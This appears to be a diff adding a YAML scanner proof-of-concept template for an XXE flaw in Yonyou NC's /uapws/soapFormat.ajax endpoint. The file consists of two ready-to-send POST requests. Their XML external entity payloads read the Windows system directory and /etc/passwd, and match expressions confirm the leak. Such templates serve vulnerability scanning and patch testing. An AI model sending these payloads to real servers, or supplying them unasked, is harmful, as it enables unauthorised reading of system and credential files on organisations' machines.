@@ -1,0 +1,31 @@
+name: poc-yaml-yonyou-nc-xxe
+binding: 77989ccf-2b30-407d-8c78-27e36277e3c8
+manual: true
+detail:
+    author: xiaobaicai
+    links:
+        - https://github.com/Str1am/OAScan/blob/main/Script/Yongyou_soapFormat_Read.py
+    vulnerability:
+        id: CT-469737
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /uapws/soapFormat.ajax
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///c:/windows/"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+        expression: response.status == 200 && response.body.bcontains(b"soap:ServerADFS") && response.body.bcontains(b"appcompat") && response.body.bcontains(b"win.ini") && response.body.bcontains(b"explorer.exe")
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /uapws/soapFormat.ajax
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:////etc/passwd"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+        expression: response.status == 200 && "root:[^:]*:[0-9]*:[0-9]*:[^:]*".bmatches(response.body)
+expression: r0() || r1()
